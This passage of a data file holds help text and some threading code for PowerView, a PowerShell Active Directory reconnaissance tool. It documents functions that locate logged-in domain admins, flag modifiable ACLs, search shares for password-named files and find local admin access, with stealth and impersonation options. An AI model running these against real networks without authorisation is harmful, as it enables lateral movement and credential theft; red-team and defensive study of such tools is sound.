                            '        # force a single-threaded apartment state '
                            '(for token-impersonation stuffz)\n'
                            '        $SessionState.ApartmentState = '
                            '[System.Threading.ApartmentState]::STA\n'
                            '\n'
                            "        # import the current session state's "
                            'variables and functions so the chained PowerView\n'
                            '        #   functionality can be used by the '
                            'threaded blocks\n'
                            '        if (-not $NoImports) {\n'
                            '            # grab all the current variables for '
                            'this runspace\n'
                            '            $MyVars = Get-Variable -Scope 2\n'
                            '\n'
                            '            # these Variables are added by '
                            'Runspace.Open() Method and produce Stop errors if '
                            'you add them twice\n'
                            '            $VorbiddenVars = '
                            "@('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')\n"
                            '\n'
                            '            # add Variables from Parent Scope '
                            '(current runspace) into the InitialSessionState\n'
                            '            ForEach ($Var in $MyVars) {\n'
                            '                if ($VorbiddenVars -NotContains '
                            '$Var.Name) {\n'
                            '                '
                            '$SessionState.Variables.Add((New-Object -TypeName '
                            'System.Management.Automation.Runspaces.SessionStateVariableEntry '
                            '-ArgumentList '
                            '$Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))\n'
                            '                }\n'
                            '            }\n'
                            '\n'
                            '            # add Functions from current runspace '
                            'to the InitialSessionState\n'
                            '            ForEach ($Function in (Get-ChildItem '
                            'Function:)) {\n'
                            '                '
                            '$SessionState.Commands.Add((New-Object -TypeName '
                            'System.Management.Automation.Runspaces.SessionStateFunctionEntry '
                            '-ArgumentList $Function.Name, '
                            '$Function.Definition))\n'
                            '            }\n'
                            '        }\n'
                            '\n'
                            '        # threading adapted from\n'
                            '        # '
                            'https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407\n'
                            '        #   Thanks Carlos!\n'
                            '\n'
                            '        # create a pool of maxThread runspaces\n'
                            '        $Pool = '
                            '[RunspaceFactory]::CreateRunspacePool(1, '
                            '$Threads, $SessionState, $Host)\n'
                            '        $Pool.Open()\n'
                            '\n'
                            '        # do some trickery to get the proper '
                            'BeginInvoke() method that allows for an output '
                            'queue\n'
                            '        $Method = $Null\n'
                            '        ForEach ($M in [PowerShell].GetMethods() '
                            "| Where-Object { $_.Name -eq 'BeginInvoke' }) {\n"
                            '            $MethodParameters = '
                            '$M.GetParameters()\n'
                            '            if (($MethodParameters.Count -eq 2) '
                            "-and $MethodParameters[0].Name -eq 'input' -and "
                            "$MethodParameters[1].Name -eq 'output') {\n"
                            '                $Method = '
                            '$M.MakeGenericMethod([Object], [Object])\n'
                            '                break\n'
                            '            }\n'
                            '        }\n'
                            '\n'
                            '        $Jobs = @()\n'
                            '        $ComputerName = $ComputerName | '
                            'Where-Object {$_ -and $_.Trim()}\n'
                            '        Write-Verbose "[New-ThreadedFunction] '
                            'Total number of hosts: $($ComputerName.count)"\n'
                            '\n'
                            '        # partition all hosts from -ComputerName '
                            'into $Threads number of groups\n'
                            '        if ($Threads -ge $ComputerName.Length) {\n'
                            '            $Threads = $ComputerName.Length\n'
                            '        }\n'
                            '        $ElementSplitSize = '
                            '[Int]($ComputerName.Length/$Threads)\n'
                            '        $ComputerNamePartitioned = @()\n'
                            '        $Start = 0\n'
                            '        $End = $ElementSplitSize\n'
                            '\n'
                            '        for($i = 1; $i -le $Threads; $i++) {\n'
                            '            $List = New-Object '
                            'System.Collections.ArrayList\n'
                            '            if ($i -eq $Threads) {\n'
                            '                $End = $ComputerName.Length\n'
                            '            }\n'
                            '            '
                            '$List.AddRange($ComputerName[$Start..($End-1)])\n'
                            '            $Start += $ElementSplitSize\n'
                            '            $End += $ElementSplitSize\n'
                            '            $ComputerNamePartitioned += '
                            '@(,@($List.ToArray()))\n'
                            '        }\n'
                            '\n'
                            '        Write-Verbose "[New-ThreadedFunction] '
                            'Total number of threads/partitions: $Threads"\n'
                            '\n'
                            '        ForEach ($ComputerNamePartition in '
                            '$ComputerNamePartitioned) {\n'
                            '            # create a "powershell pipeline '
                            'runner"\n'
                            '            $PowerShell = [PowerShell]::Create()\n'
                            '            $PowerShell.runspacepool = $Pool\n'
                            '\n'
                            '            # add the script block + arguments '
                            'with the given computer partition\n'
                            '            $Null = '
                            "$PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', "
                            '$ComputerNamePartition)\n'
                            '            if ($ScriptParameters) {\n'
                            '                ForEach ($Param in '
                            '$ScriptParameters.GetEnumerator()) {\n'
                            '                    $Null = '
                            '$PowerShell.AddParameter($Param.Name, '
                            '$Param.Value)\n'
                            '                }\n'
                            '            }\n'
                            '\n'
                            '            # create the output queue\n'
                            '            $Output = New-Object '
                            'Management.Automation.PSDataCollection[Object]\n'
                            '\n'
                            '            # kick off execution using the '
                            'BeginInvok() method that allows queues\n'
                            '            $Jobs += @{\n'
                            '                PS = $PowerShell\n'
                            '                Output = $Output\n'
                            '                Result = '
                            '$Method.Invoke($PowerShell, @($Null, '
                            '[Management.Automation.PSDataCollection[Object]]$Output))\n'
                            '            }\n'
                            '        }\n'
                            '    }\n'
                            '\n'
                            '    END {\n'
                            '        Write-Verbose "[New-ThreadedFunction] '
                            'Threads executing"\n'
                            '\n'
                            '        # continuously loop through each job '
                            'queue, consuming output as appropriate\n'
                            '        Do {\n'
                            '            ForEach ($Job in $Jobs) {\n'
                            '                $Job.Output.ReadAll()\n'
                            '            }\n'
                            '            Start-Sleep -Seconds 1\n'
                            '        }\n'
                            '        While (($Jobs | Where-Object { -not '
                            '$_.Result.IsCompleted }).Count -gt 0)\n'
                            '\n'
                            '        $SleepSeconds = 100\n'
                            '        Write-Verbose "[New-ThreadedFunction] '
                            'Waiting $SleepSeconds seconds for final '
                            'cleanup..."\n'
                            '\n'
                            "        # cleanup- make sure we didn't miss "
                            'anything\n'
                            '        for ($i=0; $i -lt $SleepSeconds; $i++) {\n'
                            '            ForEach ($Job in $Jobs) {\n'
                            '                $Job.Output.ReadAll()\n'
                            '                $Job.PS.Dispose()\n'
                            '            }\n'
                            '            Start-Sleep -S 1\n'
                            '        }\n'
                            '\n'
                            '        $Pool.Dispose()\n'
                            '        Write-Verbose "[New-ThreadedFunction] all '
                            'threads completed"\n'
                            '    }\n'
                            '}\n'
                            '\n'
                            '\n'
                            '.SYNOPSIS\n'
                            '\n'
                            'Finds domain machines where specific users are '
                            'logged into.\n'
                            '\n'
                            'Author: Will Schroeder (@harmj0y)  \n'
                            'License: BSD 3-Clause  \n'
                            'Required Dependencies: Get-DomainFileServer, '
                            'Get-DomainDFSShare, Get-DomainController, '
                            'Get-DomainComputer, Get-DomainUser, '
                            'Get-DomainGroupMember, Invoke-UserImpersonation, '
                            'Invoke-RevertToSelf, Get-NetSession, '
                            'Test-AdminAccess, Get-NetLoggedon, '
                            'Resolve-IPAddress, New-ThreadedFunction  \n'
                            '\n'
                            '.DESCRIPTION\n'
                            '\n'
                            'This function enumerates all machines on the '
                            'current (or specified) domain\n'
                            'using Get-DomainComputer, and queries the domain '
                            'for users of a specified group\n'
                            "(default 'Domain Admins') with "
                            'Get-DomainGroupMember. Then for each server the\n'
                            'function enumerates any active user sessions with '
                            'Get-NetSession/Get-NetLoggedon\n'
                            'The found user list is compared against the '
                            'target list, and any matches are\n'
                            'displayed. If -ShowAll is specified, all results '
                            'are displayed instead of\n'
                            'the filtered set. If -Stealth is specified, then '
                            'likely highly-trafficed servers\n'
                            'are enumerated with '
                            'Get-DomainFileServer/Get-DomainController, and '
                            'session\n'
                            'enumeration is executed only against those '
                            'servers. If -Credential is passed,\n'
                            'then Invoke-UserImpersonation is used to '
                            'impersonate the specified user\n'
                            'before enumeration, reverting after with '
                            'Invoke-RevertToSelf.\n'
                            '\n'
                            '.PARAMETER ComputerName\n'
                            '\n'
                            'Specifies an array of one or more hosts to '
                            'enumerate, passable on the pipeline.\n'
                            'If -ComputerName is not passed, the default '
                            'behavior is to enumerate all machines\n'
                            'in the domain returned by Get-DomainComputer.\n'
                            '\n'
                            '.PARAMETER Domain\n'
                            '\n'
                            'Specifies the domain to query for computers AND '
                            'users, defaults to the current domain.\n'
                            '\n'
                            '.PARAMETER ComputerDomain\n'
                            '\n'
                            'Specifies the domain to query for computers, '
                            'defaults to the current domain.\n'
                            '\n'
                            '.PARAMETER ComputerLDAPFilter\n'
                            '\n'
                            'Specifies an LDAP query string that is used to '
                            'search for computer objects.\n'
                            '\n'
                            '.PARAMETER ComputerSearchBase\n'
                            '\n'
                            'Specifies the LDAP source to search through for '
                            'computers,\n'
                            'e.g. "LDAP://OU=secret,DC=testlab,DC=local". '
                            'Useful for OU queries.\n'
                            '\n'
                            '.PARAMETER ComputerUnconstrained\n'
                            '\n'
                            'Switch. Search computer objects that have '
                            'unconstrained delegation.\n'
                            '\n'
                            '.PARAMETER ComputerOperatingSystem\n'
                            '\n'
                            'Search computers with a specific operating '
                            'system, wildcards accepted.\n'
                            '\n'
                            '.PARAMETER ComputerServicePack\n'
                            '\n'
                            'Search computers with a specific service pack, '
                            'wildcards accepted.\n'
                            '\n'
                            '.PARAMETER ComputerSiteName\n'
                            '\n'
                            'Search computers in the specific AD Site name, '
                            'wildcards accepted.\n'
                            '\n'
                            '.PARAMETER UserIdentity\n'
                            '\n'
                            'Specifies one or more user identities to search '
                            'for.\n'
                            '\n'
                            '.PARAMETER UserDomain\n'
                            '\n'
                            'Specifies the domain to query for users to search '
                            'for, defaults to the current domain.\n'
                            '\n'
                            '.PARAMETER UserLDAPFilter\n'
                            '\n'
                            'Specifies an LDAP query string that is used to '
                            'search for target users.\n'
                            '\n'
                            '.PARAMETER UserSearchBase\n'
                            '\n'
                            'Specifies the LDAP source to search through for '
                            'target users.\n'
                            'e.g. "LDAP://OU=secret,DC=testlab,DC=local". '
                            'Useful for OU queries.\n'
                            '\n'
                            '.PARAMETER UserGroupIdentity\n'
                            '\n'
                            'Specifies a group identity to query for target '
                            "users, defaults to 'Domain Admins.\n"
                            'If any other user specifications are set, then '
                            'UserGroupIdentity is ignored.\n'
                            '\n'
                            '.PARAMETER UserAdminCount\n'
                            '\n'
                            'Switch. Search for users users with '
                            "'(adminCount=1)' (meaning are/were privileged).\n"
                            '\n'
                            '.PARAMETER UserAllowDelegation\n'
                            '\n'
                            'Switch. Search for user accounts that are not '
                            "marked as 'sensitive and not allowed for "
                            "delegation'.\n"
                            '\n'
                            '.PARAMETER CheckAccess\n'
                            '\n'
                            'Switch. Check if the current user has local admin '
                            'access to computers where target users are '
                            'found.\n'
                            '\n'
                            '.PARAMETER Server\n'
                            '\n'
                            'Specifies an Active Directory server (domain '
                            'controller) to bind to.\n'
                            '\n'
                            '.PARAMETER SearchScope\n'
                            '\n'
                            'Specifies the scope to search under for '
                            'computers, Base/OneLevel/Subtree (default of '
                            'Subtree).\n'
                            '\n'
                            '.PARAMETER ResultPageSize\n'
                            '\n'
                            'Specifies the PageSize to set for the LDAP '
                            'searcher object.\n'
                            '\n'
                            '.PARAMETER ServerTimeLimit\n'
                            '\n'
                            'Specifies the maximum amount of time the server '
                            'spends searching. Default of 120 seconds.\n'
                            '\n'
                            '.PARAMETER Tombstone\n'
                            '\n'
                            'Switch. Specifies that the searcher should also '
                            'return deleted/tombstoned objects.\n'
                            '\n'
                            '.PARAMETER Credential\n'
                            '\n'
                            'A [Management.Automation.PSCredential] object of '
                            'alternate credentials\n'
                            'for connection to the target domain and target '
                            'systems.\n'
                            '\n'
                            '.PARAMETER StopOnSuccess\n'
                            '\n'
                            'Switch. Stop hunting after finding after finding '
                            'a target user.\n'
                            '\n'
                            '.PARAMETER Delay\n'
                            '\n'
                            'Specifies the delay (in seconds) between '
                            'enumerating hosts, defaults to 0.\n'
                            '\n'
                            '.PARAMETER Jitter\n'
                            '\n'
                            'Specifies the jitter (0-1.0) to apply to any '
                            'specified -Delay, defaults to +/- 0.3\n'
                            '\n'
                            '.PARAMETER ShowAll\n'
                            '\n'
                            'Switch. Return all user location results instead '
                            'of filtering based on target\n'
                            'specifications.\n'
                            '\n'
                            '.PARAMETER Stealth\n'
                            '\n'
                            'Switch. Only enumerate sessions from connonly '
                            'used target servers.\n'
                            '\n'
                            '.PARAMETER StealthSource\n'
                            '\n'
                            "The source of target servers to use, 'DFS' "
                            '(distributed file servers),\n'
                            "'DC' (domain controllers), 'File' (file servers), "
                            "or 'All' (the default).\n"
                            '\n'
                            '.PARAMETER Threads\n'
                            '\n'
                            'The number of threads to use for user searching, '
                            'defaults to 20.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Find-DomainUserLocation\n'
                            '\n'
                            "Searches for 'Domain Admins' by enumerating every "
                            'computer in the domain.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Find-DomainUserLocation -Stealth -ShowAll\n'
                            '\n'
                            'Enumerates likely highly-trafficked servers, '
                            'performs just session enumeration\n'
                            'against each, and outputs all results.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Find-DomainUserLocation -UserAdminCount '
                            "-ComputerOperatingSystem 'Windows 7*' -Domain "
                            'dev.testlab.local\n'
                            '\n'
                            'Enumerates Windows 7 computers in '
                            'dev.testlab.local and returns user results for '
                            'privileged\n'
                            'users in dev.testlab.local.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            '$SecPassword = ConvertTo-SecureString '
                            "'Password123!' -AsPlainText -Force\n"
                            '$Cred = New-Object '
                            "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                            '$SecPassword)\n'
                            'Find-DomainUserLocation -Domain testlab.local '
                            '-Credential $Cred\n'
                            '\n'
                            'Searches for domain admin locations in the '
                            'testlab.local using the specified alternate '
                            'credentials.\n'
                            '\n'
                            '.OUTPUTS\n'
                            '\n'
                            'PowerView.UserLocation\n',
 'Find-InterestingDomainAcl': '.SYNOPSIS\n'
                              '\n'
                              'Finds object ACLs in the current (or specified) '
                              'domain with modification\n'
                              'rights set to non-built in objects.\n'
                              '\n'
                              'Thanks Sean Metcalf (@pyrotek3) for the idea '
                              'and guidance.\n'
                              '\n'
                              'Author: Will Schroeder (@harmj0y)  \n'
                              'License: BSD 3-Clause  \n'
                              'Required Dependencies: Get-DomainObjectAcl, '
                              'Get-DomainObject, Convert-ADName  \n'
                              '\n'
                              '.DESCRIPTION\n'
                              '\n'
                              'This function enumerates the ACLs for every '
                              'object in the domain with Get-DomainObjectAcl,\n'
                              'and for each returned ACE entry it checks if '
                              'principal security identifier\n'
                              'is *-1000 (meaning the account is not built '
                              'in), and also checks if the rights for\n'
                              'the ACE mean the object can be modified by the '
                              'principal. If these conditions are met,\n'
                              'then the security identifier SID is translated, '
                              'the domain object is retrieved, and\n'
                              'additional IdentityReference* information is '
                              'appended to the output object.\n'
                              '\n'
                              '.PARAMETER Domain\n'
                              '\n'
                              'Specifies the domain to use for the query, '
                              'defaults to the current domain.\n'
                              '\n'
                              '.PARAMETER ResolveGUIDs\n'
                              '\n'
                              'Switch. Resolve GUIDs to their display names.\n'
                              '\n'
                              '.PARAMETER LDAPFilter\n'
                              '\n'
                              'Specifies an LDAP query string that is used to '
                              'filter Active Directory objects.\n'
                              '\n'
                              '.PARAMETER SearchBase\n'
                              '\n'
                              'The LDAP source to search through, e.g. '
                              '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                              'Useful for OU queries.\n'
                              '\n'
                              '.PARAMETER Server\n'
                              '\n'
                              'Specifies an Active Directory server (domain '
                              'controller) to bind to.\n'
                              '\n'
                              '.PARAMETER SearchScope\n'
                              '\n'
                              'Specifies the scope to search under, '
                              'Base/OneLevel/Subtree (default of Subtree).\n'
                              '\n'
                              '.PARAMETER ResultPageSize\n'
                              '\n'
                              'Specifies the PageSize to set for the LDAP '
                              'searcher object.\n'
                              '\n'
                              '.PARAMETER ServerTimeLimit\n'
                              '\n'
                              'Specifies the maximum amount of time the server '
                              'spends searching. Default of 120 seconds.\n'
                              '\n'
                              '.PARAMETER Tombstone\n'
                              '\n'
                              'Switch. Specifies that the searcher should also '
                              'return deleted/tombstoned objects.\n'
                              '\n'
                              '.PARAMETER Credential\n'
                              '\n'
                              'A [Management.Automation.PSCredential] object '
                              'of alternate credentials\n'
                              'for connection to the target domain.\n'
                              '\n'
                              '.EXAMPLE\n'
                              '\n'
                              'Find-InterestingDomainAcl\n'
                              '\n'
                              'Finds interesting object ACLS in the current '
                              'domain.\n'
                              '\n'
                              '.EXAMPLE\n'
                              '\n'
                              'Find-InterestingDomainAcl -Domain '
                              'dev.testlab.local -ResolveGUIDs\n'
                              '\n'
                              'Finds interesting object ACLS in the '
                              'ev.testlab.local domain and\n'
                              'resolves rights GUIDs to display names.\n'
                              '\n'
                              '.EXAMPLE\n'
                              '\n'
                              '$SecPassword = ConvertTo-SecureString '
                              "'Password123!' -AsPlainText -Force\n"
                              '$Cred = New-Object '
                              "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                              '$SecPassword)\n'
                              'Find-InterestingDomainAcl -Credential $Cred '
                              '-ResolveGUIDs\n'
                              '\n'
                              '.OUTPUTS\n'
                              '\n'
                              'PowerView.ACL\n'
                              '\n'
                              'Custom PSObject with ACL entries.\n',
 'Find-InterestingDomainShareFile': '.SYNOPSIS\n'
                                    '\n'
                                    'Searches for files matching specific '
                                    'criteria on readable shares\n'
                                    'in the domain.\n'
                                    '\n'
                                    'Author: Will Schroeder (@harmj0y)  \n'
                                    'License: BSD 3-Clause  \n'
                                    'Required Dependencies: '
                                    'Get-DomainComputer, '
                                    'Invoke-UserImpersonation, '
                                    'Invoke-RevertToSelf, Get-NetShare, '
                                    'Find-InterestingFile, '
                                    'New-ThreadedFunction  \n'
                                    '\n'
                                    '.DESCRIPTION\n'
                                    '\n'
                                    'This function enumerates all machines on '
                                    'the current (or specified) domain\n'
                                    'using Get-DomainComputer, and enumerates '
                                    'the available shares for each\n'
                                    'machine with Get-NetShare. It will then '
                                    'use Find-InterestingFile on each\n'
                                    'readhable share, searching for files '
                                    'marching specific criteria. If '
                                    '-Credential\n'
                                    'is passed, then Invoke-UserImpersonation '
                                    'is used to impersonate the specified\n'
                                    'user before enumeration, reverting after '
                                    'with Invoke-RevertToSelf.\n'
                                    '\n'
                                    '.PARAMETER ComputerName\n'
                                    '\n'
                                    'Specifies an array of one or more hosts '
                                    'to enumerate, passable on the pipeline.\n'
                                    'If -ComputerName is not passed, the '
                                    'default behavior is to enumerate all '
                                    'machines\n'
                                    'in the domain returned by '
                                    'Get-DomainComputer.\n'
                                    '\n'
                                    '.PARAMETER ComputerDomain\n'
                                    '\n'
                                    'Specifies the domain to query for '
                                    'computers, defaults to the current '
                                    'domain.\n'
                                    '\n'
                                    '.PARAMETER ComputerLDAPFilter\n'
                                    '\n'
                                    'Specifies an LDAP query string that is '
                                    'used to search for computer objects.\n'
                                    '\n'
                                    '.PARAMETER ComputerSearchBase\n'
                                    '\n'
                                    'Specifies the LDAP source to search '
                                    'through for computers,\n'
                                    'e.g. '
                                    '"LDAP://OU=secret,DC=testlab,DC=local". '
                                    'Useful for OU queries.\n'
                                    '\n'
                                    '.PARAMETER ComputerOperatingSystem\n'
                                    '\n'
                                    'Search computers with a specific '
                                    'operating system, wildcards accepted.\n'
                                    '\n'
                                    '.PARAMETER ComputerServicePack\n'
                                    '\n'
                                    'Search computers with a specific service '
                                    'pack, wildcards accepted.\n'
                                    '\n'
                                    '.PARAMETER ComputerSiteName\n'
                                    '\n'
                                    'Search computers in the specific AD Site '
                                    'name, wildcards accepted.\n'
                                    '\n'
                                    '.PARAMETER Include\n'
                                    '\n'
                                    'Only return files/folders that match the '
                                    'specified array of strings,\n'
                                    'i.e. @(*.doc*, *.xls*, *.ppt*)\n'
                                    '\n'
                                    '.PARAMETER SharePath\n'
                                    '\n'
                                    'Specifies one or more specific share '
                                    'paths to search, in the form '
                                    '\\\\COMPUTER\\Share\n'
                                    '\n'
                                    '.PARAMETER ExcludedShares\n'
                                    '\n'
                                    'Specifies share paths to exclude, default '
                                    'of C$, Admin$, Print$, IPC$.\n'
                                    '\n'
                                    '.PARAMETER LastAccessTime\n'
                                    '\n'
                                    'Only return files with a LastAccessTime '
                                    'greater than this date value.\n'
                                    '\n'
                                    '.PARAMETER LastWriteTime\n'
                                    '\n'
                                    'Only return files with a LastWriteTime '
                                    'greater than this date value.\n'
                                    '\n'
                                    '.PARAMETER CreationTime\n'
                                    '\n'
                                    'Only return files with a CreationTime '
                                    'greater than this date value.\n'
                                    '\n'
                                    '.PARAMETER OfficeDocs\n'
                                    '\n'
                                    'Switch. Search for office documents '
                                    '(*.doc*, *.xls*, *.ppt*)\n'
                                    '\n'
                                    '.PARAMETER FreshEXEs\n'
                                    '\n'
                                    'Switch. Find .EXEs accessed within the '
                                    'last 7 days.\n'
                                    '\n'
                                    '.PARAMETER Server\n'
                                    '\n'
                                    'Specifies an Active Directory server '
                                    '(domain controller) to bind to.\n'
                                    '\n'
                                    '.PARAMETER SearchScope\n'
                                    '\n'
                                    'Specifies the scope to search under for '
                                    'computers, Base/OneLevel/Subtree (default '
                                    'of Subtree).\n'
                                    '\n'
                                    '.PARAMETER ResultPageSize\n'
                                    '\n'
                                    'Specifies the PageSize to set for the '
                                    'LDAP searcher object.\n'
                                    '\n'
                                    '.PARAMETER ServerTimeLimit\n'
                                    '\n'
                                    'Specifies the maximum amount of time the '
                                    'server spends searching. Default of 120 '
                                    'seconds.\n'
                                    '\n'
                                    '.PARAMETER Tombstone\n'
                                    '\n'
                                    'Switch. Specifies that the searcher '
                                    'should also return deleted/tombstoned '
                                    'objects.\n'
                                    '\n'
                                    '.PARAMETER Credential\n'
                                    '\n'
                                    'A [Management.Automation.PSCredential] '
                                    'object of alternate credentials\n'
                                    'for connection to the target domain and '
                                    'target systems.\n'
                                    '\n'
                                    '.PARAMETER Delay\n'
                                    '\n'
                                    'Specifies the delay (in seconds) between '
                                    'enumerating hosts, defaults to 0.\n'
                                    '\n'
                                    '.PARAMETER Jitter\n'
                                    '\n'
                                    'Specifies the jitter (0-1.0) to apply to '
                                    'any specified -Delay, defaults to +/- '
                                    '0.3\n'
                                    '\n'
                                    '.PARAMETER Threads\n'
                                    '\n'
                                    'The number of threads to use for user '
                                    'searching, defaults to 20.\n'
                                    '\n'
                                    '.EXAMPLE\n'
                                    '\n'
                                    'Find-InterestingDomainShareFile\n'
                                    '\n'
                                    "Finds 'interesting' files on the current "
                                    'domain.\n'
                                    '\n'
                                    '.EXAMPLE\n'
                                    '\n'
                                    'Find-InterestingDomainShareFile '
                                    '-ComputerName '
                                    "@('windows1.testlab.local','windows2.testlab.local')\n"
                                    '\n'
                                    "Finds 'interesting' files on readable "
                                    'shares on the specified systems.\n'
                                    '\n'
                                    '.EXAMPLE\n'
                                    '\n'
                                    '$SecPassword = ConvertTo-SecureString '
                                    "'Password123!' -AsPlainText -Force\n"
                                    '$Cred = New-Object '
                                    "System.Management.Automation.PSCredential('DEV\\dfm.a', "
                                    '$SecPassword)\n'
                                    'Find-DomainShare -Domain testlab.local '
                                    '-Credential $Cred\n'
                                    '\n'
                                    'Searches interesting files in the '
                                    'testlab.local domain using the specified '
                                    'alternate credentials.\n'
                                    '\n'
                                    '.OUTPUTS\n'
                                    '\n'
                                    'PowerView.FoundFile\n',
 'Find-InterestingFile': '.SYNOPSIS\n'
                         '\n'
                         'Searches for files on the given path that match a '
                         'series of specified criteria.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: Add-RemoteConnection, '
                         'Remove-RemoteConnection  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'This function recursively searches a given UNC path '
                         'for files with\n'
                         'specific keywords in the name (default of pass, '
                         'sensitive, secret, admin,\n'
                         'login and unattend*.xml). By default, hidden '
                         'files/folders are included\n'
                         'in search results. If -Credential is passed, '
                         'Add-RemoteConnection/Remove-RemoteConnection\n'
                         'is used to temporarily map the remote share.\n'
                         '\n'
                         '.PARAMETER Path\n'
                         '\n'
                         'UNC/local path to recursively search.\n'
                         '\n'
                         '.PARAMETER Include\n'
                         '\n'
                         'Only return files/folders that match the specified '
                         'array of strings,\n'
                         'i.e. @(*.doc*, *.xls*, *.ppt*)\n'
                         '\n'
                         '.PARAMETER LastAccessTime\n'
                         '\n'
                         'Only return files with a LastAccessTime greater than '
                         'this date value.\n'
                         '\n'
                         '.PARAMETER LastWriteTime\n'
                         '\n'
                         'Only return files with a LastWriteTime greater than '
                         'this date value.\n'
                         '\n'
                         '.PARAMETER CreationTime\n'
                         '\n'
                         'Only return files with a CreationTime greater than '
                         'this date value.\n'
                         '\n'
                         '.PARAMETER OfficeDocs\n'
                         '\n'
                         'Switch. Search for office documents (*.doc*, *.xls*, '
                         '*.ppt*)\n'
                         '\n'
                         '.PARAMETER FreshEXEs\n'
                         '\n'
                         'Switch. Find .EXEs accessed within the last 7 days.\n'
                         '\n'
                         '.PARAMETER ExcludeFolders\n'
                         '\n'
                         'Switch. Exclude folders from the search results.\n'
                         '\n'
                         '.PARAMETER ExcludeHidden\n'
                         '\n'
                         'Switch. Exclude hidden files and folders from the '
                         'search results.\n'
                         '\n'
                         '.PARAMETER CheckWriteAccess\n'
                         '\n'
                         'Switch. Only returns files the current user has '
                         'write access to.\n'
                         '\n'
                         '.PARAMETER Credential\n'
                         '\n'
                         'A [Management.Automation.PSCredential] object of '
                         'alternate credentials\n'
                         'to connect to remote systems for file enumeration.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Find-InterestingFile -Path "C:\\Backup\\"\n'
                         '\n'
                         'Returns any files on the local path C:\\Backup\\ '
                         'that have the default\n'
                         'search term set in the title.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Find-InterestingFile -Path "\\\\WINDOWS7\\Users\\" '
                         '-LastAccessTime (Get-Date).AddDays(-7)\n'
                         '\n'
                         'Returns any files on the remote path '
                         '\\\\WINDOWS7\\Users\\ that have the default\n'
                         'search term set in the title and were accessed '
                         'within the last week.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "$SecPassword = ConvertTo-SecureString 'Password123!' "
                         '-AsPlainText -Force\n'
                         '$Cred = New-Object '
                         "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                         '$SecPassword)\n'
                         'Find-InterestingFile -Credential $Cred -Path '
                         '"\\\\PRIMARY.testlab.local\\C$\\Temp\\"\n'
                         '\n'
                         '.OUTPUTS\n'
                         '\n'
                         'PowerView.FoundFile\n',
 'Find-LocalAdminAccess': '.SYNOPSIS\n'
                          '\n'
                          'Finds machines on the local domain where the '
                          'current user has local administrator access.\n'
                          '\n'
                          'Author: Will Schroeder (@harmj0y)  \n'
                          'License: BSD 3-Clause  \n'
                          'Required Dependencies: Get-DomainComputer, '
                          'Invoke-UserImpersonation, Invoke-RevertToSelf, '
                          'Test-AdminAccess, New-ThreadedFunction  \n'
                          '\n'
                          '.DESCRIPTION\n'
                          '\n'
                          'This function enumerates all machines on the '
                          'current (or specified) domain\n'
                          'using Get-DomainComputer, and for each computer it '
                          'checks if the current user\n'
                          'has local administrator access using '
                          'Test-AdminAccess. If -Credential is passed,\n'
                          'then Invoke-UserImpersonation is used to '
                          'impersonate the specified user\n'
                          'before enumeration, reverting after with '
                          'Invoke-RevertToSelf.\n'
                          '\n'
                          'Idea adapted from the local_admin_search_enum post '
                          'module in Metasploit written by:\n'
                          '    \'Brandon McCann "zeknox" '
                          "<bmccann[at]accuvant.com>'\n"
                          '    \'Thomas McCarthy "smilingraccoon" '
                          "<smilingraccoon[at]gmail.com>'\n"
                          '    \'Royce Davis "r3dy" '
                          "<rdavis[at]accuvant.com>'\n"
                          '\n'
                          '.PARAMETER ComputerName\n'
                          '\n'
                          'Specifies an array of one or more hosts to '
                          'enumerate, passable on the pipeline.\n'
                          'If -ComputerName is not passed, the default '
                          'behavior is to enumerate all machines\n'
                          'in the domain returned by Get-DomainComputer.\n'
                          '\n'
                          '.PARAMETER ComputerDomain\n'
                          '\n'
                          'Specifies the domain to query for computers, '
                          'defaults to the current domain.\n'
                          '\n'
                          '.PARAMETER ComputerLDAPFilter\n'
                          '\n'
                          'Specifies an LDAP query string that is used to '
                          'search for computer objects.\n'
                          '\n'
                          '.PARAMETER ComputerSearchBase\n'
                          '\n'
                          'Specifies the LDAP source to search through for '
                          'computers,\n'
                          'e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful '
                          'for OU queries.\n'
                          '\n'
                          '.PARAMETER ComputerOperatingSystem\n'
                          '\n'
                          'Search computers with a specific operating system, '
                          'wildcards accepted.\n'
                          '\n'
                          '.PARAMETER ComputerServicePack\n'
                          '\n'
                          'Search computers with a specific service pack, '
                          'wildcards accepted.\n'
                          '\n'
                          '.PARAMETER ComputerSiteName\n'
                          '\n'
                          'Search computers in the specific AD Site name, '
                          'wildcards accepted.\n'
                          '\n'
                          '.PARAMETER CheckShareAccess\n'
                          '\n'
                          'Switch. Only display found shares that the local '
                          'user has access to.\n'
                          '\n'
                          '.PARAMETER Server\n'
                          '\n'
                          'Specifies an Active Directory server (domain '
                          'controller) to bind to.\n'
                          '\n'
                          '.PARAMETER SearchScope\n'
                          '\n'
                          'Specifies the scope to search under for computers, '
                          'Base/OneLevel/Subtree (default of Subtree).\n'
                          '\n'
                          '.PARAMETER ResultPageSize\n'
                          '\n'
                          'Specifies the PageSize to set for the LDAP searcher '
                          'object.\n'
                          '\n'
                          '.PARAMETER ServerTimeLimit\n'
                          '\n'
                          'Specifies the maximum amount of time the server '
